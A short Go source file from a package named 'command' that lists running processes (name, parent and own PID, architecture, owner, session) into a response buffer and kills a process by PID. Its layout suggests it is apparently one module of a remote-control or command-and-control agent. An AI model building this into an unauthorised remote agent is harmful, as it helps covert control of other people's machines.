package command

import (
	"errors"
	"fmt"
	"github.com/shirou/gopsutil/v3/process"
	"main/sysinfo"
	"strconv"
)

func ListProcess(pendingRequest []byte) []byte {
	processes, _ := process.Processes()
	result := ""
	for _, p := range processes {
		pid := p.Pid
		parent, _ := p.Parent()
		pPid := parent.Pid
		name, _ := p.Name()
		owner, _ := p.Username()
		sessionId := sysinfo.GetProcessSessionId(pid)
		arch := sysinfo.GetProcessArch(pid)
		var archString string
		if arch == sysinfo.ProcessArch64 {
			archString = "x64"
		} else {
			archString = "x86"
		}

		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
	}
	//fmt.Println(title)

	return append(pendingRequest, []byte(result)...)
}

func KillProcess(pid int32) error {
	processes, err := process.Processes()
	if err != nil {
		return err
	}
	for _, p := range processes {
		if p.Pid == pid {
			return p.Kill()
		}
	}
	return errors.New("process" + strconv.Itoa(int(pid)) + "not found")
}
